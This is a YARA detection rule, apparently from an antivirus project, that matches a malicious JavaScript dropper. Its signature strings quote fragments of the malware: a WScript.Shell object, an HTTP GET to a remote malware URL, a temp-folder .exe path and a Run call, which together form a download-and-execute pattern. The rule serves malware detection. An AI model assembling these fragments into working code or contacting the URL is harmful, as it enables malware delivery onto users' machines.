rule sig_20160401_b711cf29dabbcfee913aea8bda8ff724 {
  meta:
    description = "datamaliciousorder - file 20160401_b711cf29dabbcfee913aea8bda8ff724.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e701d179fe4c9b70c1c9ba9b4ebea621d9b93d736b31a19fc7c89b1ecc851bd9"

  strings:
    $s1  = "var YwlIsl = function UiaNgb() {return WScript[QkjEa](\"WScript\"+\".Shell\");}(), WeCt = 11;" fullword ascii
    $s2  = "function BaMus(ByMo, EoYst){QeEql = QeEql * 1; return ByMo - EoYst;};" fullword ascii
    $s3  = "if (GhHg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "GhHg[DyKt](\"G\" + \"ET\", \"http://ekotrade.linuxpl.info/b6dsa\", false);" fullword ascii
    $s5  = "function LhuSlb() {return YwlIsl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"lS0wjorc6JTXymT.ex\" + \"e\";};" fullword ascii
    $s6  = "function IigZeb(){return LiTr + \"\";};" fullword ascii
    $s7  = "function QjrFoy() {return ((DvKr == true) && (DvKr == ZdUon)) ? 1 : QeEql;};" fullword ascii
    $s8  = "EbNc[\"type\"] = WaTt(1);" fullword ascii
    $s9  = "function VnkOgw(XjDr){YwlIsl[\"R\"+\"un\"](XjDr, QeEql, QeEql);};" fullword ascii
    $s10 = "XryDs[\"position\"] = WaTt(QeEql);" fullword ascii
    $s11 = "return BaMus(MsXjl, JfrUzh);" fullword ascii
    $s12 = "function HcdYs(){return 23;};" fullword ascii
    $s13 = "ZdUon = true; " fullword ascii
    $s14 = "}while (XygIur);" fullword ascii
    $s15 = "var SyeLul = new this[\"Date\"]();" fullword ascii
    $s16 = "DvKr = true; " fullword ascii
    $s17 = "var SjjYzw = false;" fullword ascii
    $s18 = "function WaTt(AfwSy) {var ErdBkn = (1, 2, 3, 4, 5, AfwSy); return ErdBkn;};" fullword ascii
    $s19 = "function FocUtj()" fullword ascii
    $s20 = "var DvKr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}